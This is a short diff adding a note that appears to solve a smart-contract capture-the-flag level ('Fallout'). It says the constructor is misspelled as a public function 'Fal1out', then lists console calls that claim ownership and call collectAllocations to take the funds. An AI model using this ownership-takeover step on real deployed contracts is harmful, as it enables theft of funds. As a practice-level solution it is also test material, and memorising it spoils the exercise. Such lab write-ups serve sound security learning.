@@ -1,0 +1,12 @@
+Simple contract type the constructor is not write correcly regarding the contract name
+
+contract.Fal1out.sendTransaction({from: player, to: contract.address, value: 1})
+
+Do the job
+
+contract.owner()
+
+contract.collectAllocations()
+
+Done
+
